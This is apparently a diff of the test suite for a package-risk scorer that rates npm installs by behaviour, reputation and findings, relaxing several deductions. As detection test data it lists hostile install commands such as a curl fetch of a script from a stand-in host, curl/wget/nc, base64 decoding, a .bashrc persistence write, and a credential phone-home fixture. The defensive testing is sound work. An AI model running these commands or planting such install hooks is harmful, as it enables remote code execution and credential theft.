@@ -91,8 +91,8 @@ const CASES: Array<{ name: string; in: Partial<ScoreInput>; score: number; verdi
   { name: "TLS interception refused", in: { behaviour: beh({ tlsRefused: ["pinned.example"] }) }, score: 65, verdict: "Caution" },
   { name: "one install-hook exec", in: { behaviour: beh({ suspiciousInstallExecs: ["curl -s x"] }) }, score: 70, verdict: "Caution" },
   { name: "three install-hook execs cap at -30", in: { behaviour: beh({ suspiciousInstallExecs: ["curl", "wget", "nc"] }) }, score: 55, verdict: "High risk" },
-  { name: "one distribution fetch", in: { behaviour: beh({ distributionFetches: ["github.com"] }) }, score: 82, verdict: "Low risk" },
-  { name: "four distribution fetches cap at -9", in: { behaviour: beh({ distributionFetches: ["a", "b", "c", "d"] }) }, score: 76, verdict: "Caution" },
+  { name: "a distribution fetch (prebuilt binary, release asset) costs nothing on its own", in: { behaviour: beh({ distributionFetches: ["github.com"] }) }, score: 85, verdict: "Low risk" },
+  { name: "four distribution fetches still cost nothing", in: { behaviour: beh({ distributionFetches: ["a", "b", "c", "d"] }) }, score: 85, verdict: "Low risk" },
   { name: "behaviour group floors at -85", in: { behaviour: beh({ decoyReads: ["a"], tunnelingDns: ["b"], tlsRefused: ["c"], nonDistributionHosts: ["d", "e"] }) }, score: 0, verdict: "Malicious" },
   { name: "malicious dependency caps at 25", in: { malicious: [{ ecosystem: "npm", name: "evil", version: "1.0.0", ids: ["MAL-2025-1"] }], reputation: STRONG_REP }, score: 25, verdict: "Malicious" },
   { name: "one reachable high static finding", in: { staticFindings: [sf({})] }, score: 73, verdict: "Caution" },
@@ -104,7 +104,7 @@ const CASES: Array<{ name: string; in: Partial<ScoreInput>; score: number; verdi
   { name: "Jev malicious high", in: { checkFindings: [cf({})] }, score: 77, verdict: "Caution" },
   { name: "Jev suspicious medium", in: { checkFindings: [cf({ severity: "medium", verdict: "suspicious" })] }, score: 81, verdict: "Low risk" },
   { name: "Jev benign answer is worth 0", in: { checkFindings: [cf({ verdict: "benign", severity: "low" })] }, score: 85, verdict: "Low risk" },
-  { name: "Jev unclear answer is worth 0 points but blocks 90", in: { checkFindings: [cf({ verdict: "unclear", severity: "low" })], reputation: STRONG_REP }, score: 89, verdict: "Low risk" },
+  { name: "Jev unclear answer is worth 0 points and does not block 90 (it is listed as not verified)", in: { checkFindings: [cf({ verdict: "unclear", severity: "low" })], reputation: STRONG_REP }, score: 90, verdict: "No threats observed" },
   { name: "Jev answer on an unreachable file is worth 0", in: { checkFindings: [cf({ reach: "unreachable" })] }, score: 85, verdict: "Low risk" },
   { name: "Jev and static on the same line dedup to the worst", in: { staticFindings: [sf({ line: 9 })], checkFindings: [cf({})] }, score: 73, verdict: "Caution" },
   {
@@ -131,12 +131,12 @@ const CASES: Array<{ name: string; in: Partial<ScoreInput>; score: number; verdi
     score: 79,
     verdict: "Caution",
   },
-  { name: "new GitHub owner", in: { reputation: { ...NO_REP, ownerAgeDays: 10 } }, score: 80, verdict: "Low risk" },
+  { name: "new GitHub owner is shown but takes nothing off", in: { reputation: { ...NO_REP, ownerAgeDays: 10 } }, score: 85, verdict: "Low risk" },
   {
-    name: "reputation lower bound -8",
+    name: "every negative reputation signal together still takes nothing off",
     in: { reputation: { ...NO_REP, ownerAgeDays: 5, npmFirstPublishDays: 3, maintainerChangedWithin30d: true } },
-    score: 77,
-    verdict: "Caution",
+    score: 85,
+    verdict: "Low risk",
   },
   { name: "install failed caps at 74", in: { install: "failed" }, score: 74, verdict: "Caution" },
   { name: "install timeout never lowers the score", in: { install: "timeout", entry: "skipped", reputation: STRONG_REP }, score: 90, verdict: "No threats observed" },
@@ -151,8 +151,61 @@ const CASES: Array<{ name: string; in: Partial<ScoreInput>; score: number; verdi
   { name: "scanner coverage missing blocks 90", in: { coverage: { scanners: false, osv: true, checks: true }, reputation: STRONG_REP }, score: 89, verdict: "Low risk" },
   { name: "OSV coverage missing blocks 90", in: { coverage: { scanners: true, osv: false, checks: true }, reputation: STRONG_REP }, score: 89, verdict: "Low risk" },
   { name: "Jev check coverage missing blocks 90", in: { coverage: { scanners: true, osv: true, checks: false }, reputation: STRONG_REP }, score: 89, verdict: "Low risk" },
-  { name: "negative reputation blocks 90", in: { reputation: { ...STRONG_REP, maintainerChangedWithin30d: true, npmFirstPublishDays: 2, ownerAgeDays: 10, ownerEstablished: false, weeklyDownloads: 0 } }, score: 77, verdict: "Caution" },
+  { name: "negative reputation alone takes nothing off", in: { reputation: { ...STRONG_REP, maintainerChangedWithin30d: true, npmFirstPublishDays: 2, ownerAgeDays: 10, ownerEstablished: false, weeklyDownloads: 0 } }, score: 85, verdict: "Low risk" },
 ];
+
+// The two real runs this rule set is held to (docs/runs/2.0-keyday.md steps 10 and 11):
+// expressjs/express at 0dee2c5, whose install ran `bash -c "npm install"` (the
+// harness) and npm's own `sh -c` lifecycle scripts and fetched only from the npm
+// registry, and the phone-home fixture, which POSTs the decoy AWS credentials to a
+// forged host during install.
+const EXPRESS_FORGED: ForgedCallData[] = [
+  { phase: "install", proto: "dns", host: "registry.npmjs.org", port: 53, req_bytes: 36, forged_kind: "dns", canary_hits: [] },
+  { phase: "install", proto: "https", host: "registry.npmjs.org", port: 443, method: "GET", path: "/body-parser", req_bytes: 300, forged_kind: "registry", tls: "intercepted", canary_hits: [] },
+  { phase: "install", proto: "https", host: "registry.npmjs.org", port: 443, method: "GET", path: "/debug/-/debug-4.4.3.tgz", req_bytes: 300, forged_kind: "registry", tls: "intercepted", canary_hits: [] },
+];
+const EXPRESS_PROCS: ProcessEventData[] = [
+  { phase: "install", pid: 1789, ppid: 0, argv: ["bash", "-c", "npm install --prefer-offline --no-audit --no-fund"] },
+  { phase: "install", pid: 1790, ppid: 1789, argv: ["npm", "install", "--prefer-offline", "--no-audit", "--no-fund"] },
+  { phase: "install", pid: 1801, ppid: 1790, argv: ["sh", "-c", "npm install"] },
+  { phase: "install", pid: 1802, ppid: 1790, argv: ["sh", "-c", "node build.js"] },
+];
+
+test("score: express at 0dee2c5 (ordinary install, registry only) is in the top band with no deduction", () => {
+  const behaviour = deriveBehaviour({ forgedCalls: EXPRESS_FORGED, files: [], processes: EXPRESS_PROCS, canaryInFiles: [], datagramEgress: [] });
+  assert.deepEqual(behaviour, NO_BEHAVIOUR, "the harness shell, npm lifecycle shells and registry traffic are not behaviour");
+  const r = computeScore(input({ behaviour, reputation: STRONG_REP }));
+  assert.equal(r.verdict, "No threats observed");
+  assert.ok(r.score >= 90, `score ${r.score}`);
+  assert.deepEqual(r.breakdown.filter((d) => d.points < 0), [], "nothing is taken off");
+  assert.ok(r.notVerified.length >= BASE_NOT_VERIFIED.length, "still never a bare Safe");
+});
+
+test("score: the phone-home fixture (forged call with the decoy credential plus a decoy read) is Malicious 0", () => {
+  const behaviour = deriveBehaviour({ forgedCalls: FIXTURE_FORGED, files: FIXTURE_FILES, processes: FIXTURE_PROCS, canaryInFiles: [], datagramEgress: [] });
+  const r = computeScore(input({ behaviour, reputation: NO_REP }));
+  assert.equal(r.verdict, "Malicious");
+  assert.equal(r.score, 0);
+});
+
+test("score: every point taken off cites evidence", () => {
+  const cases: Partial<ScoreInput>[] = [
+    { behaviour: deriveBehaviour({ forgedCalls: FIXTURE_FORGED, files: FIXTURE_FILES, processes: FIXTURE_PROCS, canaryInFiles: [], datagramEgress: [] }) },
+    { behaviour: beh({ suspiciousInstallExecs: ["curl -fsSL https://x.example/i.sh"], tlsRefused: ["pinned.example"], persistenceWrites: ["/home/cr/.bashrc"] }) },
+    { docs: { declaresNoNetwork: true, declaresPure: false, quote: "Makes no network requests." }, behaviour: beh({ distributionFetches: ["github.com"] }) },
+    { checkFindings: [cf({ verdict: "malicious", severity: "high" })] },
+    { reputation: { ...NO_REP, ownerAgeDays: 5, npmFirstPublishDays: 3, maintainerChangedWithin30d: true } },
+  ];
+  for (const c of cases) {
+    const r = computeScore(input(c));
+    for (const d of r.breakdown.filter((x) => x.points < 0 && x.group !== "cap" && x.code !== "behaviour_floor")) {
+      assert.ok((d.evidence ?? []).some((e) => e.trim().length > 0), `${d.code} took ${d.points} without evidence`);
+    }
+  }
+  // A docs contradiction with no quoted sentence cannot be cited, so it does not apply.
+  const unquoted = computeScore(input({ docs: { declaresNoNetwork: true, declaresPure: false, quote: null }, behaviour: beh({ distributionFetches: ["github.com"] }) }));
+  assert.ok(!unquoted.breakdown.some((d) => d.code === "docs_contradicted_by_behaviour"));
+});
 
 test("score: an install timeout scores the same as a completed install and is stated as not verified", () => {
   const done = computeScore(input({ reputation: STRONG_REP }));
@@ -227,7 +280,8 @@ test("behaviour classifiers", () => {
   assert.equal(isPersistencePath("/etc/hosts"), true);
   assert.equal(isPersistencePath("/work/app/node_modules/x/.profile.js"), false);
   assert.equal(isSuspiciousInstallExec(["/usr/bin/curl", "-s", "x"]), true);
-  assert.equal(isSuspiciousInstallExec(["bash", "-c", "x"]), true);
+  assert.equal(isSuspiciousInstallExec(["bash", "-c", "x"]), false, "a shell is how npm and the harness run every script");
+  assert.equal(isSuspiciousInstallExec(["bash", "-c", "npm install --no-audit --no-fund"]), false);
   assert.equal(isSuspiciousInstallExec(["sh", "-c", "node beacon.js"]), false);
   assert.equal(isSuspiciousInstallExec(["base64", "-d"]), true);
   assert.equal(isSuspiciousInstallExec(["node", "x.js"]), false);
